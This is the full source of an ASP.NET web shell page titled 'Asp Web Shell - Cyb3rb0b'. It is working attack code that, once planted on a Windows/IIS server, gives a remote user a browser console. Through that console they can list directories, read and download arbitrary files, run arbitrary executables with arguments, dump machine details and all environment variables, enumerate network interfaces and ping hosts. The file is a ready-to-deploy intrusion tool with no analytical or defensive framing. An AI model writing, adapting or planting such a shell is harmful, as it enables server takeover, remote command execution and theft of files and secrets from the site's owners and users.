<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">



    <style>
        body {
            background-color: #fffff;
            color: #FFFFFF;
            overflow: hidden;
        }

        td:nth-child(0n + 2) {
            color: green;
        }
    </style>
    <title>Asp Web Shell - Cyb3rb0b</title>

</head>
<script language="c#" runat="server">



    string Dir(string path)
    {
        StringBuilder sbl = new StringBuilder();
        if (path.StartsWith("~"))
        {
            path = Server.MapPath(path);
            sbl.Append("Directory: " + path + "<br/><br/>");
        }
        if (Directory.Exists(path))
        {

            sbl.Append("<table>");
            string[] folders = Directory.GetDirectories(path);
            foreach (string d in folders)
            {
                DirectoryInfo info = new DirectoryInfo(d);
                sbl.Append("<tr>");
                sbl.Append("<td>" + info.CreationTime.ToString("dd/MM/yyyy HH:MM") + "</td>");
                sbl.Append("<td>&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;</td>");
                sbl.Append("<td>" + info.Name + "</td>");

                sbl.Append("</tr>");
            }

            string[] files = Directory.GetFiles(path);
            foreach (string f in files)
            {
                FileInfo info = new FileInfo(f);
                sbl.Append("<tr>");
                sbl.Append("<td>" + info.CreationTime.ToString("dd/MM/yyyy HH:MM") + "</td>");
                sbl.Append("<td>&nbsp;&nbsp;" + info.Length.ToString() + "&nbsp;&nbsp;</td>");
                sbl.Append("<td>" + info.Name + "</td>");
                sbl.Append("</tr>");
            }

            sbl.Append("</table>");
            return sbl.ToString();
        }
        else
        {
            return "<div style='color:red'>File Not Found " + path + "</div>";
        }

    }

    string Read(string filename)
    {
        StringBuilder sbl = new StringBuilder();
        if (File.Exists(filename))
        {
            string content = File.ReadAllText(filename);

            sbl.Append("Content of " + filename + "<br/>");
            sbl.Append("<div style='border-style:groove'>" + content + "</div>");


        }
        else
        {
            sbl.Append("<div style='color:red'>File Not Found " + filename + "</div>");
        }

        return sbl.ToString();
    }

    void Download(string filename)
    {
        if (File.Exists(filename))
        {
            FileInfo info = new FileInfo(filename);
            System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
            response.ClearContent();
            response.Clear();
            response.ContentType = "application/unknown";
            response.AddHeader("Content-Disposition", "attachment; filename=" + info.Name + ";");
            response.TransmitFile(filename);
            response.Flush();
            response.End();

        }
        else
        {
            this.dvResult.InnerHtml = "<div style='color:red'>File Not Found " + filename + "</div>";
        }
    }

    string Run(string filename, string arguments = null)
    {
        StringBuilder sb = new StringBuilder();
        if (File.Exists(filename))
        {
            Process process = new Process();
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = filename;
            psi.RedirectStandardOutput = true;
            if (arguments != null)
            {

                psi.Arguments = arguments.Replace("run", "").Replace(filename, "").TrimStart(); ;
            }
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            process.StartInfo = psi;
            process.Start();


            StreamReader myStreamReader = process.StandardError;
            string error = myStreamReader.ReadToEnd();

            StreamReader stmrdr = process.StandardOutput;
            string s = stmrdr.ReadToEnd();
            stmrdr.Close();

            if (myStreamReader != null)
            {
                myStreamReader.Close();
            }

            sb.Append("<div style='color:red'>" + error + "</div>");
            sb.Append("<div style='color:green'>" + s + "</div>");

        }
        else
        {
            sb.Append("<div style='color:red'>File Not Found " + filename + "</div>");
        }

        return sb.ToString();
    }

    string Info()
    {
        string folder = Server.MapPath("~");
        StringBuilder sbl = new StringBuilder();
        sbl.Append("<table>");
        sbl.AppendFormat("<tr><td><span style='color:green'>Machine Name</span></td><td> {0}</td></tr>", Environment.MachineName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td><span style='color:green'>Os Version</span></td><td> {0}</td></tr>", Environment.OSVersion);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td><span style='color:green'>User Domain Name</span></td><td> {0}</td></tr>", Environment.UserDomainName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td><span style='color:green'>User Name</span></td><td> {0}</td></tr>", Environment.UserName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td><span style='color:green'>Current Folder</span></td><td> {0}</td></tr></table>", folder);



        IDictionary environmentVariables = Environment.GetEnvironmentVariables();
        foreach (DictionaryEntry de in environmentVariables)
        {
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td><span style='color:green'>{0}</span></td><td> {1}</td></tr></table>", de.Key, de.Value);

        }

        return sbl.ToString();
    }

    string IpConfig()
    {
        StringBuilder sbl = new StringBuilder();
        sbl.Append("<table>");
        sbl.Append("<tr><td>Hostname:</td><td>" + Dns.GetHostName() + "</td></tr>");

        foreach (System.Net.NetworkInformation.NetworkInterface iface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
        {

            sbl.Append("<tr><td ><span style='color:yellow;font-weight=bold'>" + iface.Name + "</span></td><td><span style='color:cyan'>" + iface.OperationalStatus.ToString() + "</span></td></tr>");
            var properties = iface.GetIPProperties();

            foreach (var address in properties.UnicastAddresses)
            {

                if (address.Address.IsIPv6LinkLocal)
                {
                    sbl.Append("<tr><td>Link-local IPv6 Address . . . . . :</td><td><span style='font-weight:bold'>" + address.Address.ToString() + "</span></td></tr>");
                }
                else
                {
                    sbl.Append("<tr><td>IPv4 Address . . . . . :</td><td><span style='font-weight:bold'>" + address.Address.ToString() + "</span></td></tr>");
                }

            }

            if (properties.GatewayAddresses.Count > 0)
            {
                sbl.Append("<tr><td>Gateway . . . . . :</td><td><ul>");
                foreach (var gw in iface.GetIPProperties().GatewayAddresses)
                {

                    sbl.Append("<li>" + gw.Address.ToString() + "</li>");
                }
                sbl.Append("</ul></td></tr>");
            }


            sbl.Append("<tr><td>MAC . . . . . . . :</td><td>"+iface.GetPhysicalAddress().ToString()+"</td></tr>");
            sbl.Append("<tr><td colspan='2'><hr/></td></tr>");

        }

        sbl.Append("</table>");

        return sbl.ToString();
    }

    string Ping(string host)
    {
        StringBuilder sbl = new StringBuilder();
        System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions();
        options.DontFragment = true;
        string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        byte[] buffer = Encoding.ASCII.GetBytes(data);
        System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
        System.Net.NetworkInformation.PingReply reply = ping.Send(host, 120, buffer, options);
        sbl.Append("<table>");
        
        if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
        {
            sbl.Append("<tr><td>Pinging " + reply.Address.ToString() + " with " + reply.Buffer.Length.ToString() + " bytes of data:</td></tr>");

            sbl.Append("<tr><td>Reply from " + reply.Address.ToString() + " bytes=" + reply.Buffer.Length.ToString() + " time<" + reply.RoundtripTime + "ms TTL=" + reply.Options.Ttl.ToString() + "</td></tr>");
            
        }
            else
            {
                sbl.Append("<tr><td>Pinging " + host + " with " + buffer.Length.ToString() + " bytes of data:</td></tr>");
                sbl.Append("<tr><td>Request " + reply.Status.ToString() + "</td></tr>");
            }
        sbl.Append("</table>");
        return sbl.ToString();


    }

    protected void Cmdrun_Click(object sender, EventArgs e)
    {
        string[] commands = this.txtArg.Text.Split(new char[] { ' ' });
        string command = commands[0];
        string result = string.Empty;
        switch (command.ToLower())
        {
            case "dir":
                result = this.Dir(commands[1]);
                break;
            case "cat":
                result = this.Read(commands[1]);
                break;
            case "download":
                this.Download(commands[1]);
                break;
            case "run":
                result = this.Run(commands[1], this.txtArg.Text);
                break;
            case "info":
                result = this.Info();
                break;
            case "ipconfig":
                result = this.IpConfig();
                break;
            case "ping":
                result = this.Ping(commands[1]);
                break;
        }

        this.dvResult.InnerHtml = result;
    }

    protected void uploadfile_Click(object sender, EventArgs e)
    {

    }
</script>
<body id="body" runat="server" style="background-color: #000000">



    <form id="cmd" method="post" runat="server">



        <div style="overflow: auto; height: 90%">

            <pre id="dvResult" style="color: #FFF; height: 80%" runat="server" class="">
            </pre>
        </div>


        <div style="background-color: #000000; position: absolute; bottom: 0; width: 100%; left: 0; border: none">

            <asp:TextBox ID="txtArg" runat="server" Style="width: 80%; color: #000000; font-weight: bold;"></asp:TextBox>
            <asp:Button ID="testing" CssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="Cmdrun_Click"></asp:Button>


        </div>

    </form>
</body>
</html>

